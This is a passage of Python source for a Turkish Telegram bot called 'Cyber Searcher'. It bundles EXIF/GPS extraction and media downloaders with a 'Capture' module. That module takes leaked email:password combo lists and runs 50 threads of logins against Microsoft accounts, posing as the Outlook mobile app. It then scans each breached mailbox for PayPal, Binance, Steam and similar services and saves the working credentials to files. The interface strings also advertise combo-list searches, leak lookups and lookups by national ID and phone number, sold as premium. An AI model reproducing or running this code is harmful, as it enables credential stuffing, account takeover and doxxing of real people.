def tgid_show_my_stats(chat_id, uid, bot_instance):
    free_used = tgid_get_free_used(uid)
    free_left = max(0, TGID_FREE_LIMIT - free_used)
    balance   = tgid_get_balance(uid)
    total     = tgid_get_total(uid)

    txt = (
        f"📊 <b>TELEGRAM ID SORGU İSTATİSTİKLERİN</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔍 Toplam sorgu: <b>{total}</b>\n"
        f"🆓 Free kullanılan: <b>{free_used}</b>/{TGID_FREE_LIMIT}\n"
        f"🆓 Free kalan: <b>{free_left}</b>\n"
        f"💰 Bakiye: <b>{balance}</b>\n"
    )
    if uid == ADMIN_ID:
        txt += "\n👑 <b>Admin — Sınırsız</b>"
    elif is_premium(uid):
        txt += "\n⭐ <b>Premium — Sınırsız</b>"

    bot_instance.send_message(chat_id, txt, parse_mode="HTML")

# ══════════════════════════════════════════════════════════════
#  📸 EXIF METADATA MODÜLÜ
# ══════════════════════════════════════════════════════════════
def _exif_koordinat_cevir(deger, ref):
    try:
        d = float(deger[0]); m = float(deger[1]); s = float(deger[2])
        ondalik = d + (m / 60.0) + (s / 3600.0)
        if str(ref).upper() in ('S', 'W'):
            ondalik = -ondalik
        return round(ondalik, 7)
    except Exception:
        return None

def _exif_analiz(dosya_yolu):
    if not PIL_AVAILABLE:
        return None, "❌ Pillow kütüphanesi kurulu değil.\nKurmak için: <code>pip install Pillow</code>"
    try:
        img = Image.open(dosya_yolu)
        exif_ham = img._getexif()
    except Exception as e:
        return None, f"❌ Dosya okunamadı: {e}"
    if not exif_ham:
        return None, ("⚠️ Bu fotoğrafta EXIF verisi bulunamadı.\n"
                      "<i>Sosyal medyadan indirilmiş fotoğraflarda EXIF silinmiş olabilir.</i>")
    exif = {}; gps = {}
    for tag_id, val in exif_ham.items():
        tag = TAGS.get(tag_id, tag_id)
        if tag == "GPSInfo":
            if isinstance(val, dict):
                for gps_id, gps_val in val.items():
                    gps[GPSTAGS.get(gps_id, gps_id)] = gps_val
        else:
            exif[tag] = val
    marka = str(exif.get("Make", "Bilinmiyor")).strip()
    model = str(exif.get("Model", "Bilinmiyor")).strip()
    yazilim = str(exif.get("Software", "—")).strip()
    tarih = (exif.get("DateTimeOriginal") or exif.get("DateTime")
             or exif.get("DateTimeDigitized") or "Bilinmiyor")
    gen = (exif.get("ExifImageWidth") or exif.get("ImageWidth") or img.width)
    yuk = (exif.get("ExifImageHeight") or exif.get("ImageLength") or img.height)
    iso = exif.get("ISOSpeedRatings", "—")
    if isinstance(iso, (list, tuple)):
        iso = iso[0] if iso else "—"
    try: diyafram = f"f/{float(exif.get('FNumber')):.1f}"
    except: diyafram = "—"
    try:
        ov = float(exif.get("ExposureTime"))
        obturator = f"1/{int(round(1/ov))}s" if 0 < ov < 1 else f"{ov}s"
    except: obturator = "—"
    try: odak = f"{float(exif.get('FocalLength')):.0f} mm"
    except: odak = "—"
    flas = exif.get("Flash")
    if flas is not None:
        try: flas = "✅ Ateşlendi" if int(flas) & 1 else "❌ Ateşlenmedi"
        except: flas = "—"
    else: flas = "—"
    lens = exif.get("LensModel") or exif.get("LensMake") or "—"
    omap = {1:"Normal",2:"Ayna (Yatay)",3:"180° Döndürülmüş",4:"Ayna (Dikey)",
            5:"Ayna + 90° CW",6:"90° CW",7:"Ayna + 90° CCW",8:"90° CCW"}
    orientation = omap.get(exif.get("Orientation"), "—")
    enlem = boylam = harita = None; gps_tarih = None; gps_altitude = None
    if gps:
        enl_v = gps.get("GPSLatitude"); boy_v = gps.get("GPSLongitude")
        if enl_v and boy_v:
            enlem = _exif_koordinat_cevir(enl_v, gps.get("GPSLatitudeRef"))
            boylam = _exif_koordinat_cevir(boy_v, gps.get("GPSLongitudeRef"))
            if enlem is not None and boylam is not None:
                harita = f"https://www.google.com/maps?q={enlem},{boylam}"
        gd = gps.get("GPSDateStamp"); gt = gps.get("GPSTimeStamp")
        if gd and gt:
            try:
                h, m, s_ = [int(float(x)) for x in gt]
                gps_tarih = f"{gd} {h:02d}:{m:02d}:{s_:02d} UTC"
            except: gps_tarih = str(gd)
        alt = gps.get("GPSAltitude"); aref = gps.get("GPSAltitudeRef", 0)
        if alt is not None:
            try:
                av = float(alt)
                if int(aref) == 1: av = -av
                gps_altitude = f"{av:.1f} m"
            except: pass
    return {
        "marka":marka,"model":model,"yazilim":yazilim,"tarih":tarih,
        "genislik":gen,"yukseklik":yuk,"iso":iso,"diyafram":diyafram,
        "obturator":obturator,"odak":odak,"flas":flas,"lens":lens,
        "orientation":orientation,"enlem":enlem,"boylam":boylam,
        "harita":harita,"gps_var":bool(gps),"gps_tarih":gps_tarih,
        "gps_altitude":gps_altitude,"toplam_etiket":len(exif),
    }, None

def _exif_mesaj_olustur(d):
    cihaz = f"{d['marka']} {d['model']}".strip()
    if cihaz.lower() in ("bilinmiyor bilinmiyor", "bilinmiyor", ""):
        cihaz = "Bilinmiyor"
    msg = (f"📸 <b>EXIF METADATA ANALİZİ</b>\n{'━' * 28}\n"
           f"📱 <b>Cihaz:</b> <code>{cihaz}</code>\n"
           f"🔧 <b>Yazılım:</b> <code>{d['yazilim']}</code>\n"
           f"📅 <b>Çekim Tarihi:</b> <code>{d['tarih']}</code>\n")
    if d.get("lens") and d["lens"] != "—":
        msg += f"🔭 <b>Lens:</b> <code>{d['lens']}</code>\n"
    msg += (f"\n<b>📐 Teknik Detaylar</b>\n{'─' * 20}\n"
            f"🖼 <b>Boyut:</b> <code>{d['genislik']} × {d['yukseklik']} px</code>\n"
            f"🎯 <b>ISO:</b> <code>{d['iso']}</code>\n"
            f"📷 <b>Diyafram:</b> <code>{d['diyafram']}</code>\n"
            f"⏱ <b>Obtüratör:</b> <code>{d['obturator']}</code>\n"
            f"🔭 <b>Odak Uzaklığı:</b> <code>{d['odak']}</code>\n"
            f"⚡ <b>Flaş:</b> {d['flas']}\n"
            f"🔄 <b>Yönlendirme:</b> <code>{d['orientation']}</code>\n"
            f"🏷 <b>Toplam Etiket:</b> <code>{d.get('toplam_etiket', 0)}</code>\n")
    if d["harita"]:
        msg += (f"<b>📍 GPS KOORDİNATLARI</b>\n{'─' * 20}\n"
                f"🌐 <b>Enlem:</b> <code>{d['enlem']}</code>\n"
                f"🌐 <b>Boylam:</b> <code>{d['boylam']}</code>\n")
        if d.get("gps_altitude"): msg += f"⛰ <b>Rakım:</b> <code>{d['gps_altitude']}</code>\n"
        if d.get("gps_tarih"): msg += f"🕐 <b>GPS Zamanı:</b> <code>{d['gps_tarih']}</code>\n"
        msg += f"🗺 <b>Harita:</b> <a href='{d['harita']}'>Google Maps'te Gör</a>\n"
    else:
        msg += f"📍 <b>GPS:</b> <code>Konum verisi bulunamadı</code>\n"
    msg += f"{'━' * 28}\n🤖 <i>Cyber Searcher v4.4 | @hackledin</i>"
    return msg

# ══════════════════════════════════════════════════════════════
#  🎵 MÜZİK İNDİRİCİ
# ══════════════════════════════════════════════════════════════
MUSIC_LOCK = threading.Lock()

def _youtube_ara(sorgu):
    try:
        q = quote(sorgu)
        html = requests.get(
            f"https://www.youtube.com/results?search_query={q}",
            headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"},
            timeout=15, verify=False).text
        matches = re.findall(r'/watch\?v=([a-zA-Z0-9_-]{11})', html)
        if matches:
            return f"https://www.youtube.com/watch?v={matches[0]}"
        return None
    except Exception as e:
        print(f"[MUSIC SEARCH ERROR] {e}")
        return None

def _muzik_indir(sorgu):
    if "youtube.com" in sorgu or "youtu.be" in sorgu:
        url = sorgu
    else:
        url = _youtube_ara(sorgu)
    if not url:
        return {"ok": False, "error": "❌ Şarkı bulunamadı, farklı bir isim dene."}
    os.makedirs("muzikler", exist_ok=True)
    try:
        subprocess.run(["ffmpeg","-version"], stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL, timeout=5)
        ffmpeg_available = True
    except Exception:
        ffmpeg_available = False
    if ffmpeg_available:
        formats = [{'format':'bestaudio/best','postprocessors':[{'key':'FFmpegExtractAudio','preferredcodec':'mp3','preferredquality':'192'}]}]
    else:
        formats = [{'format':'bestaudio[ext=m4a]/bestaudio[ext=webm]/bestaudio[ext=opus]/bestaudio/best'}]
    last_error = None; info = None; dosya_adi = None
    for opts in formats:
        try:
            ydl_opts = _ytdlp_common_opts()
            ydl_opts.update({'outtmpl':'muzikler/%(id)s.%(ext)s','max_filesize':50*1024*1024})
            ydl_opts.update(opts)
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                info = ydl.extract_info(url, download=True)
                dosya_adi = ydl.prepare_filename(info)
                base, _ = os.path.splitext(dosya_adi)
                for ext in [".mp3",".m4a",".webm",".opus",".ogg"]:
                    if os.path.exists(base + ext):
                        dosya_adi = base + ext; break
                if dosya_adi and os.path.exists(dosya_adi): break
                else: dosya_adi = None
        except Exception as e:
            last_error = str(e); print(f"[MUSIC DL FORMAT ERROR] {e}"); continue
    if not dosya_adi or not os.path.exists(dosya_adi):
        return {"ok": False, "error": f"❌ İndirme başarısız: {last_error or 'bilinmeyen hata'}"}
    size = os.path.getsize(dosya_adi)
    if size > 50 * 1024 * 1024:
        try: os.remove(dosya_adi)
        except: pass
        return {"ok": False, "error": f"❌ Dosya çok büyük ({size/(1024*1024):.1f}MB). Limit: 50MB."}
    if size < 1024:
        try: os.remove(dosya_adi)
        except: pass
        return {"ok": False, "error": "❌ İndirilen dosya bozuk (çok küçük)."}
    return {"ok":True,"path":dosya_adi,"title":info.get("title","Bilinmeyen Şarkı"),
            "uploader":info.get("uploader","Bilinmiyor"),
            "duration":info.get("duration") or 0,
            "thumbnail":info.get("thumbnail"),"url":url}

def _process_music(msg, bot_instance):
    uid = msg.from_user.id
    if is_banned(uid):
        bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}"); return
    parts = msg.text.split(' ', 1)
    if len(parts) < 2:
        bot_instance.reply_to(msg,
            "🎵 **Müzik İndirici**\n━━━━━━━━━━━━━━━━━━━━━\n"
            "📌 **Kullanım:**\n`/sarki Sanatçı Şarkı`\n`/sarki https://youtube.com/...`\n"
            "🎯 **Örnekler:**\n`/sarki Tarkan Dudu`\n`/sarki Hadise Feryat`\n"
            "📁 Format: `.mp3` (ffmpeg varsa) / `.m4a`")
        return
    sorgu = parts[1].strip()
    durum = bot_instance.reply_to(msg, f"🔍 `{sorgu}` aranıyor...")
    try:
        bot_instance.edit_message_text(f"🎧 **İndiriliyor...**\n`{sorgu}`\n<i>30-60 saniye sürebilir.</i>",
                                       msg.chat.id, durum.message_id)
        result = _muzik_indir(sorgu)
        if not result["ok"]:
            bot_instance.edit_message_text(result.get("error","❌ Bilinmeyen hata!"),
                                           msg.chat.id, durum.message_id); return
        baslik = result["title"]; sanatci = result["uploader"]
        sure = result["duration"]; sure_txt = f"{int(sure//60)}:{int(sure%60):02d}" if sure else "?"
        thumb_path = None
        if result.get("thumbnail"):
            try:
                td = requests.get(result["thumbnail"], timeout=10, verify=False).content
                thumb_path = f"muzikler/thumb_{uid}_{int(time.time())}.jpg"
                with open(thumb_path, "wb") as f: f.write(td)
            except: thumb_path = None
        ext = os.path.splitext(result["path"])[1].replace(".","") or "m4a"
        caption = (f"🎵 **{baslik}**\n━━━━━━━━━━━━━━━━━━━━━\n"
                   f"👤 **Sanatçı:** {sanatci}\n⏱ **Süre:** {sure_txt}\n"
                   f"💽 **Format:** `.{ext}`\n🔗 [YouTube'da Aç]({result['url']})")
        with open(result["path"], "rb") as sarki:
            thumb_file = open(thumb_path, "rb") if thumb_path and os.path.exists(thumb_path) else None
            try:
                bot_instance.send_audio(msg.chat.id, sarki, caption=caption,
                                        title=baslik[:60], performer=sanatci[:60],
                                        duration=int(sure) if sure else 0, thumb=thumb_file)
            finally:
                if thumb_file: thumb_file.close()
                try: os.remove(result["path"])
                except: pass
                if thumb_path and os.path.exists(thumb_path):
                    try: os.remove(thumb_path)
                    except: pass
        try: bot_instance.delete_message(msg.chat.id, durum.message_id)
        except: pass
        print(f"✅ MÜZİK GÖNDERİLDİ | {get_user_name(uid)} | {baslik}")
    except Exception as e:
        print(f"[MUSIC ERROR] {e}")
        try: bot_instance.edit_message_text(f"❌ **Hata:** `{e}`", msg.chat.id, durum.message_id)
        except: bot_instance.reply_to(msg, f"❌ Hata: `{e}`")

# ══════════════════════════════════════════════════════════════
#  🎥 VİDEO İNDİRİCİ
# ══════════════════════════════════════════════════════════════
def _download_video(link):
    os.makedirs("downloads", exist_ok=True)
    ydl_opts = _ytdlp_common_opts()
    ydl_opts.update({
        "format":"bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best",
        "outtmpl":os.path.join("downloads","%(id)s.%(ext)s"),
        "max_filesize":50*1024*1024,
    })
    try:
        with YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(link, download=True)
            if "requested_downloads" in info and info["requested_downloads"]:
                path = info["requested_downloads"][0]["filepath"]
            else:
                path = ydl.prepare_filename(info)
            if not os.path.exists(path):
                base, _ = os.path.splitext(path)
                for ext in [".mp4",".mkv",".webm"]:
                    if os.path.exists(base + ext):
                        path = base + ext; break
            if not os.path.exists(path):
                return {"ok": False, "err": "İndirilen video dosyası bulunamadı."}
            size = os.path.getsize(path)
            if size > 50 * 1024 * 1024:
                os.remove(path)
                return {"ok": False, "err": f"Video boyutu ({size/(1024*1024):.1f}MB) 50MB limitini aşıyor."}
            return {"ok":True,"path":path,"title":info.get("title","Video"),
                    "size":f"{size/(1024*1024):.1f}MB","dur":info.get("duration","?"),
                    "upl":info.get("uploader","?")}
    except Exception as e:
        return {"ok": False, "err": str(e)}

def _process_video(msg, bot_instance):
    uid = msg.from_user.id
    link = msg.text.strip()
    if not link.startswith(("http://","https://")):
        bot_instance.reply_to(msg, s(uid, "invalid_link")); return
    sm = bot_instance.reply_to(msg, s(uid, "video_wait"))
    res = _download_video(link)
    if not res["ok"]:
        bot_instance.edit_message_text(s(uid, "video_err", err=res["err"]), msg.chat.id, sm.message_id); return
    cap = s(uid, "video_caption", title=res["title"][:60], size=res["size"], dur=res["dur"], upl=res["upl"])
    try:
        with open(res["path"], "rb") as f:
            bot_instance.send_video(msg.chat.id, f, caption=cap, supports_streaming=True, timeout=120)
    except Exception as e:
        bot_instance.edit_message_text(f"❌ Gönderme hatası: {e}", msg.chat.id, sm.message_id)
    finally:
        if os.path.exists(res["path"]): os.remove(res["path"])
        try: bot_instance.delete_message(msg.chat.id, sm.message_id)
        except: pass

# ══════════════════════════════════════════════════════════════
#  CAPTURE TOOL
# ══════════════════════════════════════════════════════════════
CAPTURE_APPS = {
    1:'security@facebookmail.com', 2:'security@mail.instagram.com', 3:'noreply@pubgmobile.com',
    4:'nintendo-noreply@ccg.nintendo.com', 5:'register@account.tiktok.com', 6:'info@x.com',
    7:'service@paypal.com.br', 8:'do-not-reply@ses.binance.com', 9:'info@account.netflix.com',
    10:'reply@txn-email.playstation.com', 11:'noreply@id.supercell.com', 12:'help@acct.epicgames.com',
    13:'no-reply@spotify.com', 14:'noreply@rockstargames.com', 15:'xboxreps@engage.xbox.com',
    16:'account-security-noreply@accountprotection.microsoft.com', 17:'noreply@steampowered.com',
    18:'accounts@roblox.com', 19:'EA@e.ea.com', 20:'no-reply@bitkub.com'
}
CAPTURE_NAMES = {
    1:"Facebook",2:"Instagram",3:"PUBG",4:"Konami",5:"TikTok",6:"Twitter",7:"PayPal",8:"Binance",
    9:"Netflix",10:"PlayStation",11:"Supercell",12:"Epic Games",13:"Spotify",14:"Rockstar",15:"Xbox",
    16:"Microsoft",17:"Steam",18:"Roblox",19:"EA Sports",20:"Bitkub"
}
CAPTURE_KEYWORDS = list(CAPTURE_NAMES.values())
CAPTURE_RUNNING = False
CAPTURE_LOCK = threading.Lock()
CAPTURE_RESULTS = {}
CAPTURE_HIT = 0; CAPTURE_BAD = 0; CAPTURE_PROCESSED = 0

def capture_keyboard(user_id):
    mk = InlineKeyboardMarkup(row_width=2)
    is_prem = is_premium(user_id)
    mk.add(_sep("📸 PLATFORM SEÇİNİZ"))
    if is_prem: mk.add(_btn("📸 Tüm Platformlar ⭐", "capture_all"))
    else: mk.add(_btn("📸 Tüm Platformlar 🔒 (Premium)", "noop"))
    for i in range(1, 21, 2):
        if i + 1 <= 20:
            mk.add(_btn(f"{i}. {CAPTURE_NAMES[i]}", f"capture_{i}"),
                   _btn(f"{i+1}. {CAPTURE_NAMES[i+1]}", f"capture_{i+1}"))
        else:
            mk.add(_btn(f"{i}. {CAPTURE_NAMES[i]}", f"capture_{i}"))
    if not is_prem:
        mk.add(_sep(f"📊 Kalan Hakkınız: {get_capture_limit_text(user_id)}/{FREE_CAPTURE_LIMIT}"))
        mk.add(_btn("⭐ Premium Satın Al (400⭐)", "buy_premium"))
    mk.add(_btn("◀️ Geri", "goto_hotmail"))
    return mk

def capture_get_token(email, password):
    try:
        headers = {
            "Connection":"keep-alive","Upgrade-Insecure-Requests":"1",
            "User-Agent":"Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "return-client-request-id":"false","client-request-id":"205740b4-7709-4500-a45b-b8e12f66c738",
            "x-ms-sso-ignore-sso":"1","correlation-id":str(uuid.uuid4()),
            "x-client-ver":"1.1.0+9e54a0d1","x-client-os":"28",
            "x-client-sku":"MSAL.xplat.android","x-client-src-sku":"MSAL.xplat.android",
            "X-Requested-With":"com.microsoft.outlooklite",
            "Sec-Fetch-Site":"none","Sec-Fetch-Mode":"navigate","Sec-Fetch-User":"?1","Sec-Fetch-Dest":"document",
            "Accept-Encoding":"gzip, deflate","Accept-Language":"en-US,en;q=0.9",
        }
        response = requests.get("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint="+str(email)+"&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D", headers=headers)
        cookies = response.cookies.get_dict()
        url = response.text.split("urlPost:'")[1].split("'")[0]
        ppft = response.text.split('name="PPFT" id="i0327" value="')[1].split("',")[0]
        ad = response.url.split('haschrome=1')[0]
        data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
        login_headers = {
            "Host":"login.live.com","Connection":"keep-alive","Content-Length":str(len(data)),
            "Cache-Control":"max-age=0","Upgrade-Insecure-Requests":"1",
            "Origin":"https://login.live.com","Content-Type":"application/x-www-form-urlencoded",
            "User-Agent":"Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "X-Requested-With":"com.microsoft.outlooklite",
            "Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"navigate","Sec-Fetch-User":"?1","Sec-Fetch-Dest":"document",
            "Referer":f"{ad}haschrome=1","Accept-Encoding":"gzip, deflate","Accept-Language":"en-US,en;q=0.9",
            "Cookie":f"MSPRequ={cookies['MSPRequ']};uaid={cookies['uaid']}; RefreshTokenSso={cookies['RefreshTokenSso']}; MSPOK={cookies['MSPOK']}; OParams={cookies['OParams']}; MicrosoftApplicationsTelemetryDeviceId={uuid}"
        }
        res = requests.post(url, data=data, headers=login_headers, allow_redirects=False)
        cookies = res.cookies.get_dict()
        headers = res.headers
        if any(key in cookies for key in ["JSH","JSHP","ANON","WLSSC"]) or res.text == '':
            code = headers.get('Location','').split('code=')[1].split('&')[0] if 'code=' in headers.get('Location','') else None
            cid = cookies.get('MSPCID','').upper()
            if code and cid:
                token_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
                token_data = {"client_info":"1","client_id":"e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                              "redirect_uri":"msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                              "grant_type":"authorization_code","code":code,
                              "scope":"profile openid offline_access https://outlook.office.com/M365.Access"}
                token_res = requests.post(token_url, data=token_data, headers={"Content-Type":"application/x-www-form-urlencoded"})
                access_token = token_res.json().get("access_token")
                return access_token, cid
        return None, None
    except: return None, None

def capture_get_info(email, password, token, cid, target_app=None):
    try:
        headers = {"User-Agent":"Outlook-Android/2.0","Pragma":"no-cache","Accept":"application/json",
                   "ForceSync":"false","Authorization":f"Bearer {token}","X-AnchorMailbox":f"CID:{cid}",
                   "Host":"substrate.office.com","Connection":"Keep-Alive","Accept-Encoding":"gzip"}
        r = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers).json()
        name = r.get('names',[{}])[0].get('displayName','Bilinmiyor')
        location = r.get('accounts',[{}])[0].get('location','Bilinmiyor')
        url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
        headers2 = {"Host":"outlook.live.com","content-length":"0","x-owa-sessionid":f"{cid}",
                    "x-req-source":"Mini","authorization":f"Bearer {token}",
                    "user-agent":"Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36",
                    "action":"StartupData","x-owa-correlationid":f"{cid}","ms-cv":"YizxQK73vePSyVZZXVeNr+.3",
                    "content-type":"application/json; charset=utf-8","accept":"*/*",
                    "origin":"https://outlook.live.com","x-requested-with":"com.microsoft.outlooklite",
                    "sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty",
                    "referer":"https://outlook.live.com/","accept-encoding":"gzip, deflate",
                    "accept-language":"en-US,en;q=0.9"}
        rese = requests.post(url, headers=headers2, data="").text
        found_apps = []
        for num, app_mail in CAPTURE_APPS.items():
            if app_mail in rese: found_apps.append(CAPTURE_NAMES[num])
        return {"success":True,"name":name,"country":location,"apps":found_apps,"email":email,"password":password}
    except: return {"success": False}

def capture_worker(line, user_id, user_name, is_premium, target_app=None):
    global CAPTURE_HIT, CAPTURE_BAD, CAPTURE_PROCESSED
    try:
        if ":" not in line:
            with CAPTURE_LOCK: CAPTURE_BAD += 1; CAPTURE_PROCESSED += 1
            return
        email, password = line.split(":", 1)
        email = email.strip(); password = password.strip()
        if not email or not password:
            with CAPTURE_LOCK: CAPTURE_BAD += 1; CAPTURE_PROCESSED += 1
            return
        token, cid = capture_get_token(email, password)
        if not token or not cid:
            with CAPTURE_LOCK: CAPTURE_BAD += 1; CAPTURE_PROCESSED += 1
            return
        result = capture_get_info(email, password, token, cid, target_app)
        if result.get("success"):
            apps = result.get("apps", [])
            if target_app:
                target_name = None
                for num, app_mail in CAPTURE_APPS.items():
                    if app_mail == target_app:
                        target_name = CAPTURE_NAMES[num]; break
                if target_name and target_name not in apps:
                    with CAPTURE_LOCK: CAPTURE_BAD += 1; CAPTURE_PROCESSED += 1
                    return
            with CAPTURE_LOCK:
                CAPTURE_HIT += 1
                if user_id not in CAPTURE_RESULTS: CAPTURE_RESULTS[user_id] = []
                CAPTURE_RESULTS[user_id].append(result)
            with open(f"capture_hits_{user_id}.txt", "a", encoding="utf-8") as f:
                f.write(f"Email: {email}\nPassword: {password}\nName: {result.get('name')}\n"
                        f"Country: {result.get('country')}\nApps: {', '.join(apps)}\n{'-'*40}\n")
            print(f"✅ CAPTURE HIT | {user_name} | {email}")
        else:
            with CAPTURE_LOCK: CAPTURE_BAD += 1
    except:
        with CAPTURE_LOCK: CAPTURE_BAD += 1
    finally:
        with CAPTURE_LOCK: CAPTURE_PROCESSED += 1

def start_capture_scan(combo_list, user_id, user_name, is_premium, target_app=None):
    global CAPTURE_RUNNING, CAPTURE_HIT, CAPTURE_BAD, CAPTURE_PROCESSED
    with CAPTURE_LOCK:
        CAPTURE_RUNNING = True; CAPTURE_HIT = 0; CAPTURE_BAD = 0
        CAPTURE_PROCESSED = 0; CAPTURE_RESULTS[user_id] = []
    try:
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            for line in combo_list[:1000]:
                futures.append(executor.submit(capture_worker, line, user_id, user_name, is_premium, target_app))
            for future in as_completed(futures):
                try: future.result()
                except: pass
    finally:
        with CAPTURE_LOCK: CAPTURE_RUNNING = False

# ══════════════════════════════════════════════════════════════
#  LANGUAGE HELPERS
# ══════════════════════════════════════════════════════════════
def lang(user_id):
    l = db_get(user_id, "language")
    return l if l in ("tr", "en", "ar") else "tr"

def s(user_id, key, **kw):
    l = lang(user_id)
    txt = S.get(l, S["tr"]).get(key, key)
    return txt.format(**kw) if kw else txt

# ══════════════════════════════════════════════════════════════
#  STRINGS
# ══════════════════════════════════════════════════════════════
S = {
    "tr": {
        "welcome": "🌟 <b>Cyber Searcher v4.4</b>\nHoşgeldin, <b>{name}</b>!\n📌 Durum: {status}\n🔻 Aşağıdan işlem seç:",
        "free": "🆓 Ücretsiz", "premium": "⭐ PREMIUM",
        "select_op": "🛠 Kullanmak istediğin aracı seç:",
        "combo_ask": "🌐 Domain gir (Örn: netflix.com) veya (netflix.com 100):",
        "searching": "🔍 <b>{domain}</b> taranıyor...",
        "no_result": "❌ {domain} için sonuç bulunamadı.",
        "combo_caption": "✅ <b>{domain}</b> | <b>{count}</b> Hesap\nAPI: {apis}",
        "stats_title": "📊 <b>İSTATİSTİKLERİN</b>",
        "profile_title": "👤 <b>PROFİL</b>",
        "lb_title": "🏆 <b>LİDER TABLOSU</b>",
        "help_title": "📖 <b>YARDIM MENÜSÜ</b>",
        "no_stats": "📊 Henüz hiç sorgu yapmadınız!",
        "api_title": "⚙️ <b>API DEĞİŞTİR</b>\n📌 Mevcut: <b>{cur}</b>\nBir API seç:",
        "api_set": "✅ API → <b>{api}</b>",
        "lang_pick": "🌍 Dil seçin / Select language / اختر لغتك",
        "lang_ok": "✅ Dil seçildi!",
        "premium_title": "⭐ <b>PREMIUM ÜYELİK</b>",
        "premium_price_txt": "💰 Fiyat: <b>{price} Telegram Yıldızı</b>",
        "premium_dur": "♾️ Süre: <b>Sınırsız (Ömür Boyu)</b>",
        "premium_features": "🎯 <b>PREMIUM ÖZELLİKLER</b>\n• 📧 Sınırsız Hotmail Check\n• 📸 Sınırsız Capture (20 Platform)\n• 🔖 Sınırsız Keyword\n• 🌍 Sınırsız OSINT (LeakSights)\n• 🆔 Sınırsız Telegram ID Sorgu\n• 📊 Detaylı istatistikler",
        "osint_price": "💰 OSINT Premium: 200 Yıldız",
        "already_premium": "⭐ Zaten Premium üyesiniz!",
        "prem_ok": "🎉 <b>Premium aktif!</b>",
        "buy_premium_btn": "⭐ Premium Satın Al (400⭐)",
        "buy_osint_btn": "🌍 OSINT Premium Satın Al (200⭐)",
        "back_btn": "◀️ Geri", "home_btn": "🏠 Ana Menü", "tools_btn": "🛠 Araçlar",
        "premium_req": "🔒 Premium gerekli!",
        "video_ask": "🎥 Video linkini gönder:", "video_wait": "⏳ İndiriliyor...",
        "video_err": "❌ İndirilemedi:\n<code>{err}</code>",
        "video_caption": "🎥 <b>{title}</b>\n📦 {size}  ⏱ {dur}s  👤 {upl}",
        "invalid_link": "❌ Geçerli bir link gir!",
        "ls_ask": "{icon} <b>LeakSights — {tool}</b>\n📥 Sorgu değerini gir:",
        "ls_caption": "📋 LeakSights ⭐\n🔍 Aranan: <code>{val}</code>\n📅 {date}",
        "tr_ask": "{prompt}\n📌 Sonuç TXT olarak gelir.",
        "tr_caption": "📋 {tool} Sorgu\n🔍 Param: <code>{param}</code>\n📅 {date}",
        "processing": "🔄 Sorgulanıyor...",
        "admin_only": "❌ Bu komut sadece admin içindir!",
        "no_data": "❌ Veri alınamadı.",
        "given_ok": "✅ Premium verildi: @{user}",
        "removed_ok": "✅ Premium kaldırıldı: @{user}",
        "user_nf": "❌ Kullanıcı bulunamadı!",
        "enter_val": "Değeri gir:",
        "invalid_tc": "❌ Geçersiz TC (11 haneli sayı olmalı)!",
        "invalid_gsm": "❌ Geçersiz GSM (10 haneli)!",
        "invalid_adsoyad": "❌ Ad ve Soyad gir!",
        "invalid_adaparsel": "❌ İl,İlçe formatında gir!",
        "multi_bot_list": "🤖 <b>BOT LİSTESİ</b>",
        "multi_bot_running": "🟢 Çalışıyor", "multi_bot_stopped": "🔴 Durduruldu",
        "multi_bot_total": "📊 Toplam: {count} bot",
        "multi_bot_added": "✅ Bot başlatıldı!\n🔑 Token: `{token}`\n👤 Sahip: {owner}\n📌 Durum: 🟢 Çalışıyor",
        "multi_bot_removed": "✅ Bot durduruldu!\n🔑 Token: `{token}`",
        "multi_bot_not_found": "❌ Token `{token}` bulunamadı!",
        "multi_bot_exists": "⚠️ Bu token zaten çalışıyor!",
        "multi_bot_no_bots": "📭 Hiç bot kaydı bulunamadı.",
